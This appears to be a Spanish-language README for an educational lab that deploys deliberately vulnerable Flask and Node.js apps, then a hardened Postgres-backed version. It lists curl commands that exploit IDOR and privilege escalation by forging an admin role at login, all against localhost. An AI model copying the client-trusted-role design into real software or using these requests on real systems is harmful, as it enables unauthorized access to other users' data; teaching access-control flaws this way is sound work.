# Simulaci-n-con-rutas-protegidas-Flask-Node.js-

En este laboratorio llevaremos a cabo la Simulación con rutas protegidas (Flask/Node.js), desplegado con Docker Compose. Haciendo uso de Docker local.

---
##  Requisitos
1. **Docker y Docker Compose (docker compose o docker-compose) instalados.**

2. **jq (recomendado para formatear JSON en terminal).**

3. **(opcional) psql si quieres inspeccionar la base de datos desde host.**

   Instalacion:
   <pre>
   sudo pacman -Syu docker docker-compose jq postgresql-libs
   sudo systemctl enable --now docker
   # opcional: añadir usuario al grupo docker
   sudo usermod -aG docker $USER
   </pre>

---

Los archivos ya tienen la logica y directrices necesarias para ser ejecutadas, solo es cuestion de seguir los comandos. 


## Estructura del proyecto
Version vulnerable:
<pre>
broken-access-demo/
├─ flask-app/
│  ├─ app.py
│  ├─ requirements.txt
│  └─ Dockerfile
├─ node-app/
│  ├─ index.js
│  ├─ package.json
│  └─ Dockerfile
└─ docker-compose.yml

</pre>

---

## Versión vulnerable (rutas con IDOR / role trust)

1. Construir y levantar (en foreground; puedes omitir -d para ver logs en consola):
<pre>
docker compose up --build
# o en background
docker compose up --build -d
</pre>

2. Endpoints expuestos:

Flask → http://localhost:5000

Node → http://localhost:3000

3. Comandos para explotar las vulnerabilidades (usar sólo para pruebas educativas):
Obtener token (Alice — vulnerable:
<pre>
  curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"alice"}' | jq

</pre>
Explotar IDOR: Alice lee notas de Bob (id=2):
<pre>
  T=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" -d '{"username":"alice"}' | jq -r .token)
curl -s http://localhost:5000/users/2/notes -H "Authorization: Bearer $T" | jq

</pre>
Escalada forzada pidiendo role en login (Flask):
<pre>
  T2=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"alice","role":"admin"}' | jq -r .token)
curl -s http://localhost:5000/admin/secret -H "Authorization: Bearer $T2" | jq

</pre>
Node: pedir role admin en login y acceder admin-only:
<pre>
  TOKEN=$(curl -s -X POST http://localhost:3000/login -H "Content-Type: application/json" \
  -d '{"username":"carla", "role":"admin"}' | jq -r .token)
curl -s http://localhost:3000/admin/only -H "Authorization: Bearer $TOKEN" | jq

</pre>
---
Estructura — Versión segura (con DB):

## Estructura del proyecto
Version vulnerable:
<pre>
broken-access-secure/
├─ infra/
│  └─ init_db.sql
├─ docker-compose.yml
├─ flask-app/
│  ├─ app.py
│  ├─ requirements.txt
│  └─ Dockerfile
└─ node-app/
   ├─ index.js
   ├─ package.json
   └─ Dockerfile


</pre>

- infra/init_db.sql crea la base de datos demo, tablas users y revoked_tokens, y usuarios semilla con password hashes.

- docker-compose.yml orquesta db (Postgres), flask y node.

- Flask = auth server + resource endpoints (emite JWT con jti, verifica role con DB, revoca tokens).

- Node = resource server que valida tokens y comprueba ownership/roles en DB.

---

Ejecutar — Versión segura (con Postgres)

1. Construir y levantar en background:
<pre>
# 1) Construir y levantar (en background)
docker compose up --build -d

# 2) Ver logs (opcional)
docker compose logs -f

# 3) Esperar a que Postgres esté listo (healthcheck) - si todo va bien, flask y node arrancan después.
# Si no quieres logs, espera unos 5-10s o revisa el estado:
docker compose ps
</pre>

2. Probar desde consola (instala jq para mejor lectura):
<pre>
  # LOGIN (Flask) -> Alice
TOKEN_ALICE=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alicepass"}' | jq -r .access_token)
echo "Alice token: $TOKEN_ALICE"
</pre>
# Alice lee sus notas (OK)
<pre>
curl -s http://localhost:5000/users/1/notes -H "Authorization: Bearer $TOKEN_ALICE" | jq
</pre>
# Alice intenta leer notas de Bob (id=2) -> DEBE DAR 403
<pre>
curl -s -o /dev/stderr -w "\nHTTP code: %{http_code}\n" http://localhost:5000/users/2/notes -H "Authorization: Bearer $TOKEN_ALICE"
</pre>
# Intento de escalado forzando role en login (el servidor ignora role enviado)
<pre>
TOKEN_PRETEND=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alicepass", "role":"admin"}' | jq -r .access_token)
# Ver payload (solo para debug local — decodifica sin verificar)
echo $TOKEN_PRETEND | cut -d'.' -f2 | base64 --decode || true
</pre>
# Admin Bob obtiene secret
<pre>
TOKEN_BOB=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bobpass"}' | jq -r .access_token)
curl -s http://localhost:5000/admin/secret -H "Authorization: Bearer $TOKEN_BOB" | jq
</pre>
# Node: Carla no puede leer docs de Dan (obtiene 403)
<pre>
TOKEN_CARLA=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"carla","password":"carlapass"}' | jq -r .access_token)
curl -s -o /dev/stderr -w "\nHTTP code: %{http_code}\n" http://localhost:3000/users/2/docs -H "Authorization: Bearer $TOKEN_CARLA"
</pre>
# Dan (admin) accede a node admin-only
<pre>
TOKEN_DAN=$(curl -s -X POST http://localhost:5000/login -H "Content-Type: application/json" \
  -d '{"username":"dan","password":"danpass"}' | jq -r .access_token)
curl -s http://localhost:3000/admin/only -H "Authorization: Bearer $TOKEN_DAN" | jq
</pre>
# Prueba revocación (logout)
Delante de Bearer pega el token de Alice.
<pre>
curl -v -X POST http://localhost:5000/logout -H "Authorization: Bearer <tu_token_aqui>"
</pre>
# Luego el mismo token no sirve
<pre>
curl -s -o /dev/stderr -w "\nHTTP code: %{http_code}\n" http://localhost:5000/users/1/notes -H "Authorization: Bearer $TOKEN_ALICE"
</pre>
3. Cómo inspeccionar la DB directamente (psql dentro del contenedor)

# Abrir psql en el contenedor
<pre>
docker compose exec db psql -U postgres -d demo
</pre>
# Dentro de psql, ver users
<pre>
SELECT id, username, role, notes FROM users ORDER BY id;
</pre>
# Ver revoked tokens
<pre>
SELECT * FROM revoked_tokens;
</pre>

---

## Licencia

MIT License - Solo para fines educativos

---

## Legal

USO EDUCATIVO ÚNICAMENTE. El acceso no autorizado a sistemas es ilegal.
